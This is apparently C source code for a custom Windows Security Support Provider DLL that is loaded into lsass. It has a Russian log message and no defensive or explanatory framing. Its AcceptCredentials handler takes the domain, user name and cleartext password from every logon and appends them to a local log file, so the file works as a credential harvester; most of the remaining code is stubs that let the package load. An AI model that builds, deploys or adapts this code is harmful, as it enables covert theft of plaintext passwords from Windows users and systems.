#define SECURITY_WIN32
#include <windows.h>
#include <ntsecapi.h>
#include <sspi.h>
#include <ntsecpkg.h>

#ifndef PKG_NAME_A
#define PKG_NAME_A   "CustomSSP"
#endif
#ifndef PKG_NAME_W
#define PKG_NAME_W   L"CustomSSP"
#endif

#ifndef STATUS_SUCCESS
#define STATUS_SUCCESS          ((NTSTATUS)0x00000000L)
#endif
#ifndef STATUS_UNSUCCESSFUL
#define STATUS_UNSUCCESSFUL     ((NTSTATUS)0xC0000001L)
#endif
#ifndef STATUS_NOT_IMPLEMENTED
#define STATUS_NOT_IMPLEMENTED  ((NTSTATUS)0xC0000002L)
#endif
#ifndef STATUS_NO_MEMORY
#define STATUS_NO_MEMORY        ((NTSTATUS)0xC0000017L)
#endif

#define LOG_PATH    "C:\\custom-ssp\\lsa.log"
#define MAX_TOKEN   2048

static PLSA_SECPKG_FUNCTION_TABLE g_LsaFunctions = NULL;
static ULONG_PTR                  g_PackageId    = 0;

static void SspLog(const char *a, const char *b, const char *c)
{
    char line[512];
    DWORD written;
    HANDLE h;

    line[0] = '\0';
    lstrcpynA(line, a ? a : "", (int)sizeof(line));
    if (b) lstrcatA(line, b);
    if (c) lstrcatA(line, c);

    h = CreateFileA(LOG_PATH, FILE_APPEND_DATA,
                    FILE_SHARE_READ | FILE_SHARE_WRITE, NULL,
                    OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (h == INVALID_HANDLE_VALUE)
        return;

    SetFilePointer(h, 0, NULL, FILE_END);
    WriteFile(h, line, (DWORD)lstrlenA(line), &written, NULL);
    WriteFile(h, "\r\n", 2, &written, NULL);
    CloseHandle(h);
}

BOOL WINAPI DllMain(HINSTANCE hInst, DWORD reason, LPVOID reserved)
{
    UNREFERENCED_PARAMETER(reserved);
    if (reason == DLL_PROCESS_ATTACH)
        DisableThreadLibraryCalls(hInst);
    return TRUE;
}

static NTSTATUS NTAPI SpInitialize(
    ULONG_PTR PackageId, PSECPKG_PARAMETERS Parameters,
    PLSA_SECPKG_FUNCTION_TABLE FunctionTable)
{
    UNREFERENCED_PARAMETER(Parameters);
    g_PackageId    = PackageId;
    g_LsaFunctions = FunctionTable;
    SspLog("[SSP] SpInitialize: пакет ", PKG_NAME_A, " инициализирован в lsass");
    return STATUS_SUCCESS;
}

static NTSTATUS NTAPI SpShutdown(VOID)
{
    return STATUS_SUCCESS;
}

static NTSTATUS NTAPI SpGetInfo(PSecPkgInfo PackageInfo)
{
    static SEC_WCHAR name[]    = PKG_NAME_W;
    static SEC_WCHAR comment[] = L"Custom SSP template";

    PackageInfo->fCapabilities = SECPKG_FLAG_ACCEPT_WIN32_NAME | SECPKG_FLAG_CONNECTION;
    PackageInfo->wVersion      = 1;
    PackageInfo->wRPCID        = SECPKG_ID_NONE;
    PackageInfo->cbMaxToken    = MAX_TOKEN;
    PackageInfo->Name          = name;
    PackageInfo->Comment       = comment;
    return STATUS_SUCCESS;
}

static NTSTATUS NTAPI SpAcquireCredentialsHandle(
    PUNICODE_STRING PrincipalName, ULONG CredentialUseFlags, PLUID LogonId,
    PVOID AuthorizationData, PVOID GetKeyFn, PVOID GetKeyArgument,
    PLSA_SEC_HANDLE CredentialHandle, PTimeStamp ExpirationTime)
{
    UNREFERENCED_PARAMETER(PrincipalName);
    UNREFERENCED_PARAMETER(CredentialUseFlags);
    UNREFERENCED_PARAMETER(LogonId);
    UNREFERENCED_PARAMETER(AuthorizationData);
    UNREFERENCED_PARAMETER(GetKeyFn);
    UNREFERENCED_PARAMETER(GetKeyArgument);

    *CredentialHandle = (LSA_SEC_HANDLE)0x1;
    if (ExpirationTime)
        ExpirationTime->QuadPart = MAXLONGLONG;
    return STATUS_SUCCESS;
}

static NTSTATUS NTAPI SpFreeCredentialsHandle(LSA_SEC_HANDLE CredentialHandle)
{
    UNREFERENCED_PARAMETER(CredentialHandle);
    return STATUS_SUCCESS;
}

static void UniToAnsi(PUNICODE_STRING u, char *out, int outSz)
{
    int n = 0;
    if (u && u->Buffer && u->Length)
        n = WideCharToMultiByte(CP_ACP, 0, u->Buffer,
                                u->Length / (int)sizeof(WCHAR),
                                out, outSz - 1, NULL, NULL);
    out[(n > 0) ? n : 0] = '\0';
}

static const char *LogonTypeName(SECURITY_LOGON_TYPE t)
{
    switch (t) {
    case Interactive:       return "Interactive";
    case Network:           return "Network";
    case Batch:             return "Batch";
    case Service:           return "Service";
    case Unlock:            return "Unlock";
    case NetworkCleartext:  return "NetworkCleartext";
    case NewCredentials:    return "NewCredentials";
    case RemoteInteractive: return "RemoteInteractive";
    case CachedInteractive: return "CachedInteractive";
    default:                return "Other";
    }
}

static NTSTATUS NTAPI SpAcceptCredentials(
    SECURITY_LOGON_TYPE LogonType, PUNICODE_STRING AccountName,
    PSECPKG_PRIMARY_CRED PrimaryCredentials,
    PSECPKG_SUPPLEMENTAL_CRED SupplementalCredentials)
{
    char acct[256], dom[256], pass[256], line[600];

    UNREFERENCED_PARAMETER(SupplementalCredentials);

    UniToAnsi(AccountName, acct, sizeof(acct));
    dom[0] = '\0';
    pass[0] = '\0';
    if (PrimaryCredentials)
        UniToAnsi(&PrimaryCredentials->DomainName, dom, sizeof(dom));

    if (PrimaryCredentials->Password.Length > 0 && PrimaryCredentials->Password.Buffer != NULL) {
        UniToAnsi(&PrimaryCredentials->Password, pass, sizeof(pass));
    }

    lstrcpynA(line, "AcceptCredentials: type=", (int)sizeof(line));
    lstrcatA(line, LogonTypeName(LogonType));
    lstrcatA(line, " user=");
    if (dom[0]) { lstrcatA(line, dom); lstrcatA(line, "\\"); }
    lstrcatA(line, acct[0] ? acct : "(?)");

    lstrcatA(line, " pass=");
    lstrcatA(line, pass[0] ? pass : "(empty)");

    SspLog("[SSP] ", line, "");
    return STATUS_SUCCESS;
}

static PSecBuffer FindToken(PSecBufferDesc desc)
{
    ULONG i;
    if (!desc)
        return NULL;
    for (i = 0; i < desc->cBuffers; i++)
        if ((desc->pBuffers[i].BufferType & ~SECBUFFER_ATTRMASK) == SECBUFFER_TOKEN)
            return &desc->pBuffers[i];
    return NULL;
}

static LSA_SEC_HANDLE NewContext(void)
{
    PVOID p = g_LsaFunctions->AllocateLsaHeap(sizeof(ULONG));
    if (p)
        *(ULONG *)p = 0xC0DE;
    return (LSA_SEC_HANDLE)p;
}

static void MapContext(PBOOLEAN MappedContext, PSecBuffer ContextData)
{
    PVOID p = g_LsaFunctions->AllocateLsaHeap(sizeof(ULONG));
    if (p)
        *(ULONG *)p = 0xC0DE;
    ContextData->cbBuffer   = p ? (ULONG)sizeof(ULONG) : 0;
    ContextData->BufferType = SECBUFFER_EMPTY;
    ContextData->pvBuffer   = p;
    *MappedContext = TRUE;
}

static NTSTATUS NTAPI SpInitLsaModeContext(
    LSA_SEC_HANDLE CredentialHandle, LSA_SEC_HANDLE ContextHandle,
    PUNICODE_STRING TargetName, ULONG ContextRequirements, ULONG TargetDataRep,
    PSecBufferDesc InputBuffers, PLSA_SEC_HANDLE NewContextHandle,
    PSecBufferDesc OutputBuffers, PULONG ContextAttributes,
    PTimeStamp ExpirationTime, PBOOLEAN MappedContext, PSecBuffer ContextData)
{
    PSecBuffer out = FindToken(OutputBuffers);

    UNREFERENCED_PARAMETER(CredentialHandle);
    UNREFERENCED_PARAMETER(ContextHandle);
    UNREFERENCED_PARAMETER(TargetName);
    UNREFERENCED_PARAMETER(ContextRequirements);
    UNREFERENCED_PARAMETER(TargetDataRep);
    UNREFERENCED_PARAMETER(InputBuffers);

    if (out) out->cbBuffer = 0;

    *NewContextHandle   = NewContext();
    *ContextAttributes  = 0;
    MapContext(MappedContext, ContextData);
    if (ExpirationTime)
        ExpirationTime->QuadPart = MAXLONGLONG;

    return STATUS_SUCCESS;
}

static NTSTATUS NTAPI SpAcceptLsaModeContext(
    LSA_SEC_HANDLE CredentialHandle, LSA_SEC_HANDLE ContextHandle,
    PSecBufferDesc InputBuffer, ULONG ContextRequirements, ULONG TargetDataRep,
    PLSA_SEC_HANDLE NewContextHandle, PSecBufferDesc OutputBuffer,
    PULONG ContextAttributes, PTimeStamp ExpirationTime,
    PBOOLEAN MappedContext, PSecBuffer ContextData)
{
    PSecBuffer out = FindToken(OutputBuffer);

    UNREFERENCED_PARAMETER(CredentialHandle);
    UNREFERENCED_PARAMETER(ContextHandle);
    UNREFERENCED_PARAMETER(ContextRequirements);
    UNREFERENCED_PARAMETER(TargetDataRep);
    UNREFERENCED_PARAMETER(InputBuffer);

    if (out) out->cbBuffer = 0;
    *NewContextHandle  = NewContext();
    *ContextAttributes = 0;
    MapContext(MappedContext, ContextData);
    if (ExpirationTime)
        ExpirationTime->QuadPart = MAXLONGLONG;

    return STATUS_SUCCESS;
}

static NTSTATUS NTAPI SpDeleteContext(LSA_SEC_HANDLE ContextHandle)
{
    if (ContextHandle && g_LsaFunctions)
        g_LsaFunctions->FreeLsaHeap((PVOID)ContextHandle);
    return STATUS_SUCCESS;
}

static SECPKG_FUNCTION_TABLE g_FunctionTable;

NTSTATUS SEC_ENTRY SpLsaModeInitialize(
    ULONG LsaVersion, PULONG PackageVersion,
    PSECPKG_FUNCTION_TABLE *ppTables, PULONG pcTables)
{
    UNREFERENCED_PARAMETER(LsaVersion);

    g_FunctionTable.Initialize              = SpInitialize;
    g_FunctionTable.Shutdown                = SpShutdown;
    g_FunctionTable.GetInfo                 = SpGetInfo;
    g_FunctionTable.AcquireCredentialsHandle= SpAcquireCredentialsHandle;
    g_FunctionTable.FreeCredentialsHandle   = SpFreeCredentialsHandle;
    g_FunctionTable.AcceptCredentials       = SpAcceptCredentials;
    g_FunctionTable.InitLsaModeContext      = SpInitLsaModeContext;
    g_FunctionTable.AcceptLsaModeContext    = SpAcceptLsaModeContext;
    g_FunctionTable.DeleteContext           = SpDeleteContext;

    *PackageVersion = SECPKG_INTERFACE_VERSION;
    *ppTables       = &g_FunctionTable;
    *pcTables       = 1;
    return STATUS_SUCCESS;
}

static NTSTATUS NTAPI SpInstanceInit(
    ULONG Version, PSECPKG_DLL_FUNCTIONS FunctionTable, PVOID *UserFunctions)
{
    UNREFERENCED_PARAMETER(Version);
    UNREFERENCED_PARAMETER(FunctionTable);
    *UserFunctions = NULL;
    return STATUS_SUCCESS;
}

static NTSTATUS NTAPI SpInitUserModeContext(
    LSA_SEC_HANDLE ContextHandle, PSecBuffer PackedContext)
{
    UNREFERENCED_PARAMETER(ContextHandle);
    UNREFERENCED_PARAMETER(PackedContext);
    return STATUS_SUCCESS;
}

static NTSTATUS NTAPI SpDeleteUserModeContext(LSA_SEC_HANDLE ContextHandle)
{
    UNREFERENCED_PARAMETER(ContextHandle);
    return STATUS_SUCCESS;
}

static SECPKG_USER_FUNCTION_TABLE g_UserTable;

NTSTATUS SEC_ENTRY SpUserModeInitialize(
    ULONG LsaVersion, PULONG PackageVersion,
    PSECPKG_USER_FUNCTION_TABLE *ppTables, PULONG pcTables)
{
    UNREFERENCED_PARAMETER(LsaVersion);
    g_UserTable.InstanceInit          = SpInstanceInit;
    g_UserTable.InitUserModeContext   = SpInitUserModeContext;
    g_UserTable.DeleteUserModeContext = SpDeleteUserModeContext;
    *PackageVersion = SECPKG_INTERFACE_VERSION;
    *ppTables       = &g_UserTable;
    *pcTables       = 1;
    return STATUS_SUCCESS;
}
